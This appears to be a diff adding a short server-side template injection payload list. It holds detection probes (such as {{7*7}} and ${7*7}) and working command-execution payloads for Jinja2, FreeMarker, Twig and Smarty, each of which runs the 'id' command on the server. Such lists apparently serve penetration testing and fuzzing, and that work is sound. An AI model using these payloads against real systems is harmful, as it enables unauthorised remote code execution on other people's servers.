@@ -1,0 +1,13 @@
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{7*'7'}}
+@(7*7)
+*{7*7}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+${7*7}
+{{'%s'%7}}{{config}}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{php}echo `id`;{/php}
